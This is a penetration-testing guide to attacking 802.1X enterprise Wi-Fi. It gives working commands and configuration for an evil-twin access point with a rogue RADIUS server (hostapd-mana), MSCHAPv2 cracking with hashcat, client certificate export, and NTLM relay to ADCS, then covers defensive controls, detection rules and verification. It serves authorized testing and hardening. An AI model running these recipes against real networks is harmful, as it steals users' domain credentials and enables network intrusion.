# Enterprise (802.1X) Attacks

Attacks against WPA2/WPA3-Enterprise networks: evil twin with a rogue
RADIUS server, EAP method downgrade, credential capture from PEAP-
MSCHAPv2, and certificate-based attacks. Enterprise wireless is
considered more secure than PSK, but only when server certificate
validation is enforced on clients - which is rare.

> [!CAUTION]
> Evil twin attacks against enterprise networks capture real user
> credentials. They are highly intrusive and may lock out accounts.
> Only run these against networks you own or have written
> authorization to test.

---

## 1. Overview

WPA2-Enterprise (and WPA3-Enterprise) uses **802.1X** for
authentication: the client (supplicant) authenticates to a **RADIUS
server** through the AP (authenticator). The RADIUS server validates
the credentials, often against Active Directory.

EAP methods in common use:

- **EAP-TLS** - mutual certificate authentication. Strongest method.
- **PEAP-MSCHAPv2** - server certificate + client username/password
  (MSCHAPv2). The default in most Windows deployments.
- **EAP-TTLS** - similar to PEAP, with more flexibility.
- **EAP-FAST** - Cisco's variant. Deprecated.
- **EAP-MD5** - no server certificate, cleartext password. Obsolete.

The critical security property is **server certificate validation**:
the client must verify that the RADIUS server's certificate is signed
by a trusted CA and matches the expected hostname. If the client
accepts any certificate, an evil twin with a self-signed certificate
captures the credentials.

In practice, most enterprise deployments do NOT enforce server
certificate validation. This makes evil twin attacks trivial.

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify 802.1X networks

From `airodump-ng` (file 02):

```text
BSSID              PWR  CH  ENC   CIPHER  AUTH    ESSID
12:34:56:78:9A:BD  -67   1  WPA2  CCMP    802.1X  Corp-Enterprise
```

`802.1X` in the AUTH column = enterprise.

### 2.2 Capture EAP exchange

```bash
sudo tcpdump -i wlan0 -nn -w eap.pcap 'eapol'
```

Expected output (in Wireshark):

```text
EAP-Request, Identity
EAP-Response, Identity (CORP\\jdoe)
EAP-Request, PEAP (Start)
EAP-Response, PEAP (ClientHello)
...
EAP-Request, PEAP (MSCHAPv2 Challenge)
EAP-Response, PEAP (MSCHAPv2 Response)
```

The EAP method (PEAP, TLS, TTLS) is revealed in the EAP-Request from
the server.

### 2.3 Extract EAP identities

```bash
tshark -r eap.pcap -Y "eap.type == 1" \
    -T fields -e eap.identity | sort -u
```

Expected output:

```text
CORP\\jdoe
CORP\\asmith
host/laptop-042.corp.local
```

Domain usernames leak even in encrypted 802.1X. Useful for password
spraying (`05 Network Attacks`, file 06).

### 2.4 Extract MSCHAPv2 challenge/response

```bash
# PEAP is encrypted, but the outer EAP-Response/Identity is cleartext
# For MSCHAPv2, the challenge/response is inside the TLS tunnel
# A successful evil twin captures it by terminating the tunnel

# From a rogue AP (see 4.2):
tshark -r captured.pcap -Y "eap" -V | grep -A 5 "MSCHAPv2"
```

MSCHAPv2 challenge/response is the crackable material. See 4.3.

### 2.5 Identify server certificate

```bash
# Capture the RADIUS server cert during a legitimate EAP exchange
tshark -r eap.pcap -Y "tls.handshake.type == 11" \
    -T fields -e x509sat.uTF8String -e x509ce.dNSName
```

Expected output (legitimate server):

```text
corp.local   radius.corp.local
```

If the client does not validate this, the evil twin can present any
certificate.

---

## 3. Common Attack Vectors

### 3.1 Evil twin with rogue RADIUS

Set up a fake AP with the same SSID as the legitimate enterprise
network, plus a rogue RADIUS server. The client connects, the
attacker's RADIUS terminates the EAP exchange, and the client's
credentials (MSCHAPv2 challenge/response) are captured.

**Precondition:** client does not validate the RADIUS server
certificate (default in most deployments).

**Impact:** domain credentials captured, crackable offline.

### 3.2 EAP method downgrade

If the client supports multiple EAP methods, the attacker offers a
weaker one (e.g. PEAP-MSCHAPv2 instead of EAP-TLS). The client
negotiates the weaker method and the credentials leak.

**Precondition:** client is configured to accept multiple methods,
or the attacker can manipulate the negotiation.

### 3.3 MSCHAPv2 relay

Instead of cracking the MSCHAPv2 challenge/response, relay it to
another service (SMB, LDAP, HTTP) that the user has access to.

**Precondition:** the target service accepts NTLM/ MSCHAPv2 without
signing or EPA. See `05 Network Attacks`, file 06.

### 3.4 EAP-TLS certificate attacks

If the client uses EAP-TLS with a client certificate, the attacker
cannot capture credentials (no password). However:

- If the client certificate is exportable and not protected by a
  PIN/biometric, the attacker can steal it.
- If the CA is compromised, the attacker can issue a valid client
  certificate.
- If the RADIUS server accepts a revoked certificate (CRL not
  enforced), the attacker can use a stolen cert.

### 3.5 PEAP relay to ADCS (ESC8)

If the attacker captures a PEAP-MSCHAPv2 exchange and the client has
access to ADCS HTTP enrollment, the challenge/response can be relayed
to the CA to obtain a client certificate. See `01 Active Directory`
for the full ADCS exploitation.

### 3.6 WPA3-Enterprise downgrade

WPA3-Enterprise mandates PMF, but some APs allow transition mode
(WPA2-Enterprise + WPA3-Enterprise). Force the client to use WPA2-
Enterprise and attack it as above.

### 3.7 Rogue AP with known credentials (post-credential)

If the attacker has valid domain credentials (from a previous phase),
they can set up an evil twin that uses the legitimate RADIUS server.
The client connects, authentication succeeds, and the attacker
proxies traffic for full MITM.

**Precondition:** valid credentials. This is the "post-exploitation"
use of an evil twin.

---

## 4. Exploitation Recipes

### 4.1 Capture EAP identities (passive)

```bash
sudo tcpdump -i wlan0 -nn -w eap.pcap 'eapol'
# Wait for a client to associate
```

Then extract usernames (see 2.3).

### 4.2 Evil twin with rogue RADIUS (hostapd-mana)

`hostapd-mana` is a modified hostapd that terminates the EAP exchange
and logs credentials.

```bash
# Step 1: install hostapd-mana
git clone https://github.com/sensepost/hostapd-mana.git
cd hostapd-mana
make

# Step 2: configure the evil twin
cat > /etc/hostapd-mana.conf <<'EOF'
interface=wlan0
driver=nl80211
ssid=Corp-Enterprise
channel=1
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-mana.eap_users
ca_cert=/etc/hostapd-mana/ca.pem
server_cert=/etc/hostapd-mana/server.pem
private_key=/etc/hostapd-mana/server.key
mana_wpe=1
mana_eapsuccess=1
mana_eaptls=1
EOF

# Step 3: fake EAP user file (accept any user)
cat > /etc/hostapd-mana.eap_users <<'EOF'
* PEAP,TTLS,TLS,MD5
"t" TTLS-MSCHAPV2 "password" [2]
EOF

# Step 4: start
sudo ./hostapd-mana /etc/hostapd-mana.conf
```

The client connects, hostapd-mana logs the MSCHAPv2 challenge/response.

Expected output:

```text
MANA: EAP-Response/Identity: CORP\\jdoe
MANA: MSCHAPv2: Challenge: 12:34:56:78:9a:bc:de:f0
MANA: MSCHAPv2: Response: 1a:2b:3c:4d:5e:6f:70:80:...
```

### 4.3 Crack MSCHAPv2 with hashcat

```bash
# Format: username::domain:challenge:response:...
echo 'jdoe::CORP:1234567890abcdef:1a2b3c4d5e6f7080...' > mschap.txt

hashcat -m 5500 mschap.txt /usr/share/wordlists/rockyou.txt
```

Mode 5500 = MSCHAPv2. Fast on GPU.

Expected output:

```text
mschap.txt:Summer2026!
Status...........: Cracked
```

### 4.4 Full evil twin with wpa_supplicant and FreeRADIUS

A more sophisticated setup: the evil twin proxies authentication to
the real RADIUS server (after the client connects), giving full MITM.

```bash
# Step 1: configure FreeRADIUS with the legitimate upstream
# Step 2: configure hostapd with the FreeRADIUS server
# Step 3: start the AP; clients connect and are authenticated normally
# Step 4: the attacker sees all traffic through the AP

# This requires knowing the RADIUS server's shared secret
# (or having valid credentials to authenticate on behalf)
```

### 4.5 EAP-TLS client cert theft (concept)

```bash
# If the client certificate is exportable, extract it from the client
# (requires prior access) and reuse it on the attacker's machine.

# Windows cert store export:
certutil -exportPFX -p <PIN> My <serial> C:\temp\client.pfx

# Use with wpa_supplicant:
#   private_key="/path/to/client.key"
#   client_cert="/path/to/client.pem"
```

### 4.6 Relay PEAP to ADCS (ESC8)

```bash
# Step 1: capture PEAP-MSCHAPv2 with hostapd-mana
# Step 2: relay to ADCS HTTP enrollment
sudo impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \
    --adcs --template User

# Note: this requires the relay to support MSCHAPv2, which is unusual.
# More common: relay NTLM (from file 06) to ADCS.
```

See `01 Active Directory` for the full ADCS escalation.

---

## 5. Post-Exploitation

After capturing MSCHAPv2:

- **Crack offline** with hashcat mode 5500.
- **Relay** if the target service accepts NTLM/MSCHAPv2 without
  signing.
- **Password spray** with the recovered credentials against AD
  (file 06).
- **Use for lateral movement** within the domain.

After a full evil twin with proxied authentication:

- **Full MITM** on all client traffic.
- **Capture additional credentials** from HTTP, SMB, NTLM.
- **Serve malicious payloads** (captive portal, software updates).
- **Move laterally** to internal resources.

After EAP-TLS client cert theft:

- **Impersonate the client** on the network.
- **Access resources** the client has access to.

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | Critical (credential theft) |
| Preconditions | Attacker in radio range; client does not validate RADIUS cert |
| Detectability | Medium - evil twin is detectable by WIPS; the credential capture is silent |
| Business impact | Domain credential theft, lateral movement, AD compromise |

Enterprise wireless is the **highest-value** wireless target in a
corporate network. A single captured credential can unlock the entire
AD environment.

---

## 7. Root Causes (AppSec)

- Clients do not validate the RADIUS server certificate (default
  misconfiguration).
- PEAP-MSCHAPv2 is the default EAP method (weakest of the secure
  options).
- No mutual authentication - the client authenticates to the server,
  but not vice versa.
- EAP method downgrade allowed.
- CA trust not distributed to all clients.
- No WIPS to detect the evil twin.

---

## 8. Preventive Controls (AppSec)

### 8.1 Enforce EAP-TLS with client certificates

EAP-TLS uses mutual certificate authentication. There is no password
to steal.

```text
# Windows GPO: Computer > Windows Settings > Security > Wireless
# Network (IEEE 802.11) Policies
#   Authentication method: Smart Card or other certificate
#   Validate server certificate: Yes
#   Trusted Root CA: Corp-Root-CA
```

### 8.2 Enforce server certificate validation

```text
# Windows GPO: same as above
#   Validate server certificate: Yes
#   Connect to these servers: radius.corp.local
#   Trusted Root Certification Authorities: Corp-Root-CA
#   Do not prompt user to authorize new servers: Yes
```

This is the single most effective control against evil twin attacks.

### 8.3 Use EAP-TLS with strong client cert protection

- Store client certs in a TPM or smart card.
- Require PIN or biometric to use the cert.
- Do not allow cert export.

### 8.4 Disable PEAP-MSCHAPv2 if possible

If PEAP must be used, enforce PEAP-TLS (tunneled EAP-TLS) instead of
PEAP-MSCHAPv2. This requires a client certificate inside the tunnel.

### 8.5 WPA3-Enterprise with 192-bit mode

WPA3-Enterprise 192-bit mode (Suite B) enforces EAP-TLS with strong
crypto (GCMP-256, SHA-384, ECDSA-384). This is the strongest wireless
configuration available.

```text
# hostapd.conf
wpa=2
wpa_key_mgmt=WPA-EAP-SUITE-B-192
ieee80211w=2
```

### 8.6 WIPS deployment

A WIPS detects evil twins in the RF. Essential for any enterprise
wireless deployment.

### 8.7 Network segmentation

Put wireless clients on a VLAN with firewall rules. Even if the
attacker gets on the network, their reach is limited.

---

## 9. Detection Controls (AppSec)

### 9.1 Evil twin detection

- Same SSID broadcast by two different BSSIDs (one not in the
  authorized inventory).
- New BSSID with the same SSID in a different RF location.
- RADIUS server certificate mismatches (logged by clients if
  validation is enforced).

### 9.2 EAP method downgrade detection

- Clients using a weaker EAP method than usual.
- RADIUS server offering a different EAP method than usual.

### 9.3 MSCHAPv2 cracking (offline)

Not detectable by the network. The crack happens on the attacker's
hardware. Prevention (EAP-TLS) is the only control.

### 9.4 Windows Event IDs (client-side)

- **Event 12011** (WLAN AutoConfig): authentication failed.
- **Event 12012**: certification validation failed (good sign -
  client is validating).
- **Event 8002** (NPS): EAP authentication succeeded.

### 9.5 SIEM rules

- Alert on new BSSID with an authorized SSID.
- Alert on RADIUS authentication from an unexpected AP.
- Alert on clients rejecting the RADIUS certificate (event 12012).
- Alert on EAP method changes.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **Server cert validation:** attempt an evil twin with a self-signed
   cert. The client should refuse to connect.
2. **EAP-TLS:** check the client's authentication method. Should be
   EAP-TLS, not PEAP-MSCHAPv2.
3. **Client cert protection:** attempt to export the client cert.
   Should fail (TPM-protected, non-exportable).
4. **WPA3-Enterprise 192-bit:** check the beacon RSN information
   element. Should show GCMP-256 and SHA-384.
5. **WIPS:** set up an evil twin. The WIPS should alert within minutes.

---

## 11. OSCP Notes

Enterprise wireless is **not** in the OSCP exam. It is relevant for:

- Real internal engagements with physical proximity.
- PEN-210 (OSCP+) covers enterprise wireless.
- Red team operations targeting corporate environments.

For the report, document:

- The EAP method identified.
- The evil twin setup (hostapd-mana or FreeRADIUS).
- The captured MSCHAPv2 challenge/response.
- The cracked credential.
- The defensive control (EAP-TLS, cert validation, WPA3-Enterprise).

---

## 12. Production Notes

- **Evil twin against enterprise is highly effective** when cert
  validation is not enforced - which is the default in most Windows
  deployments.
- **Test the cert validation first.** If the client validates the
  RADIUS cert, the evil twin fails immediately. Confirm before
  spending time.
- **MSCHAPv2 cracking is fast.** A weak password cracks in seconds
  on a modern GPU.
- **PEAP-MSCHAPv2 relay to ADCS is complex** but high-impact. See
  `01 Active Directory` for the full chain.
- **EAP-TLS is the strongest method.** If the target uses it, the
  evil twin is useless (no password to capture).
- **WPA3-Enterprise 192-bit is rare** in 2026 but growing. When
  deployed, it is very hard to attack.

---

## 13. References

- [hostapd-mana](https://github.com/sensepost/hostapd-mana) -
  evil twin with credential capture
- [FreeRADIUS](https://freeradius.org/) - RADIUS server
- [hashcat](https://hashcat.net/hashcat/) - mode 5500 (MSCHAPv2)
- [impacket ntlmrelayx](https://github.com/fortra/impacket) - relay
  to ADCS
- [WPA3 Specification (Wi-Fi Alliance)](https://www.wi-fi.org/discover-wi-fi/security)
- RFC 5216 - The EAP-TLS Authentication Protocol
- RFC 2759 - Microsoft PPP CHAP Extensions, Version 2 (MSCHAPv2)
- [MITRE ATT&CK T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)
- NIST SP 800-153 - Guidelines for Securing Wireless Local Area Networks
- `man hostapd`, `man wpa_supplicant`, `man eapol_test`